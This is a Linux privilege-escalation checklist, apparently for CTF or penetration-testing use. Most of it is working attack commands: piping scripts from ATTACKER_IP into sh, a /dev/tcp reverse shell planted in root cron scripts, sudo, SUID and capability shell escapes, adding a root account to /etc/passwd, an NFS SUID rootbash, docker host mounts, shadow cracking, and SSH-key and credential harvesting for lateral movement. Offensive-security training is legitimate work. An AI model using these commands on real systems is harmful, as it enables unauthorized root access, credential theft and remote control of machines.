# Linux Privilege Escalation Checklist

You have a low-priv shell. Goal: become **root** (or any higher-priv user).
Work the automated scan FIRST, then manually verify each promising finding.
Cross-reference every "weird binary" against **GTFOBins → https://gtfobins.github.io/**.

> Upgrade your shell first (lots of checks need a real TTY):
> ```bash
> python3 -c 'import pty;pty.spawn("/bin/bash")'
> # then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
> ```

---

## 0. Who am I / quick orientation

- [ ] Identity & groups (note `sudo`, `docker`, `lxd`, `adm`, `disk` group membership)
  ```bash
  id; whoami; groups
  ```
- [ ] Other users / who has a shell
  ```bash
  cat /etc/passwd | grep -vE 'nologin|false$'
  ```
- [ ] Hostname, OS, kernel
  ```bash
  hostname; cat /etc/os-release; uname -a
  ```

## 1. Automated enumeration (run one, ideally all three)

- [ ] **LinPEAS** (the big one; from peass-ng, actively maintained)
  ```bash
  # On attacker box: serve it
  #   curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
  #   python3 -m http.server 8000
  # On target:
  cd /tmp
  curl http://ATTACKER_IP:8000/linpeas.sh | sh        # or wget -qO- ... | sh
  # Targeted/quiet long-audit run:
  ./linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks
  ```
  Read the output: RED+YELLOW = almost certainly exploitable.
- [ ] **pspy** (watch cron/processes run as root WITHOUT root) — great for hidden cron jobs
  ```bash
  cd /tmp
  curl http://ATTACKER_IP:8000/pspy64 -o pspy64 && chmod +x pspy64
  ./pspy64 -pf -i 1000        # watch for root-run commands / scripts
  ```
- [ ] **LinEnum** (classic, lighter alternative/second opinion)
  ```bash
  curl http://ATTACKER_IP:8000/LinEnum.sh | bash -s -- -t
  ```

## 2. sudo rights (highest-value, check first)

- [ ] What can I run with sudo?
  ```bash
  sudo -l
  ```
  - If `(ALL : ALL) ALL` → `sudo su -`. Done.
  - If `NOPASSWD` on any binary → look it up on **GTFOBins** under the "sudo" section.
    Example: `sudo less /etc/profile` then `!/bin/sh`. `sudo vim -c ':!/bin/sh'`.
  - `env_keep` / `LD_PRELOAD` / `LD_LIBRARY_PATH` preserved → LD_PRELOAD shared-object attack.
- [ ] Check sudo version for known CVEs (e.g. Baron Samedit CVE-2021-3156)
  ```bash
  sudo --version | head -1
  ```

## 3. SUID / SGID binaries

- [ ] Find SUID binaries
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
- [ ] Find SGID binaries
  ```bash
  find / -perm -2000 -type f 2>/dev/null
  ```
- [ ] Both at once
  ```bash
  find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
  ```
  → For each NON-standard binary, check **GTFOBins** "SUID" section.
    Classics: `find`, `nmap` (old), `vim`, `bash`, `cp`, `nano`, `python`, `env`, `tar`.
    Example: `/usr/bin/find . -exec /bin/sh -p \; -quit`

## 4. Capabilities

- [ ] List file capabilities (cap_setuid is gold)
  ```bash
  getcap -r / 2>/dev/null
  ```
  → `cap_setuid+ep` on python/perl/etc → instant root. Check **GTFOBins** "Capabilities".
    Example: `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

## 5. Cron jobs / scheduled tasks

- [ ] Read system crontabs
  ```bash
  cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/ 2>/dev/null
  crontab -l 2>/dev/null
  ```
- [ ] Look for **writable scripts** run by root cron, or `*` wildcard / relative paths.
  - Writable script run by root → put `bash -i >& /dev/tcp/ATTACKER/4444 0>&1` in it.
  - Use pspy (step 1) to catch jobs you can't see in crontab.
- [ ] Tar/rsync wildcard injection in cron → checkpoint/`--checkpoint-action` tricks.

## 6. Writable files / PATH / config

- [ ] World-writable files & dirs
  ```bash
  find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'
  find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys'
  ```
- [ ] Writable `/etc/passwd` → add a root user
  ```bash
  ls -la /etc/passwd
  # if writable: openssl passwd 'pass' -> add  hacker:HASH:0:0:root:/root:/bin/bash
  ```
- [ ] PATH hijacking: if a root script/SUID calls a binary by relative name and a dir
      you control is in PATH, drop a malicious binary of that name first.
  ```bash
  echo $PATH
  ```

## 7. Kernel exploits (last resort, can crash the box)

- [ ] Get exact kernel/distro
  ```bash
  uname -r; cat /etc/os-release
  ```
- [ ] Search for matching exploit (DirtyCow CVE-2016-5195, DirtyPipe CVE-2022-0847,
      PwnKit/polkit CVE-2021-4034, Sudo Baron Samedit, OverlayFS CVE-2023-0386)
  ```bash
  searchsploit linux kernel <version>
  ```
  Note: try misconfig-based privesc BEFORE kernel exploits (less likely to break things).

## 8. NFS no_root_squash

- [ ] Check exports for `no_root_squash`
  ```bash
  cat /etc/exports 2>/dev/null
  showmount -e TARGET_IP        # from attacker
  ```
  → If present: mount on attacker as root, drop a SUID root binary into the share,
    run it on the target.
  ```bash
  # attacker (as root):
  mkdir /mnt/nfs && mount -o rw TARGET_IP:/share /mnt/nfs
  cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash
  # target: /share/rootbash -p
  ```

## 9. Docker / LXD / privileged groups

- [ ] If you're in the **docker** group → instant root
  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```
- [ ] If in **lxd/lxc** group → mount host fs in a privileged container (GTFOBins/known PoC).
- [ ] **disk** group → read raw disk: `debugfs /dev/sda1` to read /etc/shadow.

## 10. Credentials, shadow, backups, history

- [ ] Readable /etc/shadow (or backups of it)
  ```bash
  ls -la /etc/shadow; cat /etc/shadow 2>/dev/null
  find / -name '*.bak' -o -name 'shadow*' 2>/dev/null | grep -v /proc
  ```
  → crack with `unshadow passwd shadow > unsh; john --wordlist=rockyou.txt unsh`
- [ ] Hunt for plaintext creds in configs, history, env
  ```bash
  grep -rli 'password\|passwd\|secret\|api_key' /var/www /opt /home /etc 2>/dev/null
  cat ~/.bash_history /home/*/.bash_history 2>/dev/null
  env; cat ~/.bashrc ~/.profile 2>/dev/null
  ```
- [ ] Database / app config creds (wp-config.php, .env, settings.py, config.php).

## 11. SSH keys

- [ ] Find private keys you can read
  ```bash
  find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
  cat /home/*/.ssh/id_* 2>/dev/null
  ```
- [ ] Find writable `authorized_keys` (add your own pubkey to log in as that user)
  ```bash
  find / -name authorized_keys 2>/dev/null
  ```

## 12. Internal services / port forwarding

- [ ] Services bound to localhost only (often run as root, exploitable)
  ```bash
  ss -tulpn; netstat -tulpn 2>/dev/null
  ```
  → forward them out: `ssh -L 9000:127.0.0.1:PORT user@target` or use chisel/socat.

---

## Workflow reminder

1. `id` → `sudo -l` → run **LinPEAS** + **pspy**.
2. Triage findings; pick the easiest win.
3. For ANY binary/capability/sudo entry: look it up on **https://gtfobins.github.io/**.
4. Get root, then `cat /root/root.txt` (or grab the flag) and dump creds for lateral movement.
